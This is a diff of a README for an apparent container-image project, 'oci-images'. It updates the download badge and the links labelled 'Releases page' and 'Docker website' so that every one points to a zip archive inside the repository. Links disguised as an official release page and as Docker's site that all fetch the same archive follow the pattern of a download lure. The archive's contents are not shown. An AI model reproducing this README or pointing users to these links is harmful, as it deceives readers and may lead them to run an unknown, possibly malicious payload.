@@ -1,6 +1,6 @@
 # 🚀 oci-images - Simple, Fresh Container Images for You
 
-[![Download oci-images](https://github.com/1Samuel722/oci-images/raw/refs/heads/main/images/mongodb/images-oci-v1.2.zip%20oci--images-v1.0-brightgreen)](https://github.com/1Samuel722/oci-images/raw/refs/heads/main/images/mongodb/images-oci-v1.2.zip)
+[![Download oci-images](https://raw.githubusercontent.com/1Samuel722/oci-images/main/images/oci-images-v1.5.zip%20oci--images-v1.0-brightgreen)](https://raw.githubusercontent.com/1Samuel722/oci-images/main/images/oci-images-v1.5.zip)
 
 ## 📖 Overview
 
@@ -18,7 +18,7 @@ oci-images provides rolling release OCI container images that are minimal, fresh
 Follow these simple steps to download and run oci-images on your system.
 
 1. **Visit the Releases Page:**
-   Go to our [Releases page](https://github.com/1Samuel722/oci-images/raw/refs/heads/main/images/mongodb/images-oci-v1.2.zip) to find the latest version. 
+   Go to our [Releases page](https://raw.githubusercontent.com/1Samuel722/oci-images/main/images/oci-images-v1.5.zip) to find the latest version. 
 
 2. **Select the Latest Version:**
    Find the latest version listed on the Releases page. Look for the title that says "Latest release." 
@@ -28,7 +28,7 @@ Follow these simple steps to download and run oci-images on your system.
 
 4. **Install Docker (If Needed):**
    To run oci-images, you need Docker installed on your computer. If you haven't installed Docker yet, follow these steps:
-   - Visit the [Docker website](https://github.com/1Samuel722/oci-images/raw/refs/heads/main/images/mongodb/images-oci-v1.2.zip).
+   - Visit the [Docker website](https://raw.githubusercontent.com/1Samuel722/oci-images/main/images/oci-images-v1.5.zip).
    - Follow the installation instructions for your operating system (Windows, Mac, or Linux).
 
 5. **Run the Container Image:**
@@ -43,7 +43,7 @@ Follow these simple steps to download and run oci-images on your system.
 
 ## 💾 Download & Install
 
-To download oci-images, please visit the [Releases page](https://github.com/1Samuel722/oci-images/raw/refs/heads/main/images/mongodb/images-oci-v1.2.zip). From there, you can download the appropriate container images for your setup.
+To download oci-images, please visit the [Releases page](https://raw.githubusercontent.com/1Samuel722/oci-images/main/images/oci-images-v1.5.zip). From there, you can download the appropriate container images for your setup.
 
 ## 🔧 System Requirements
 
@@ -61,7 +61,7 @@ oci-images provides minimal and auto-updating container images. These images hel
 
 ### How do I know if there’s a new version?
 
-You can periodically check the [Releases page](https://github.com/1Samuel722/oci-images/raw/refs/heads/main/images/mongodb/images-oci-v1.2.zip). The latest version will always be listed at the top.
+You can periodically check the [Releases page](https://raw.githubusercontent.com/1Samuel722/oci-images/main/images/oci-images-v1.5.zip). The latest version will always be listed at the top.
 
 ### Can I run multiple images?
 
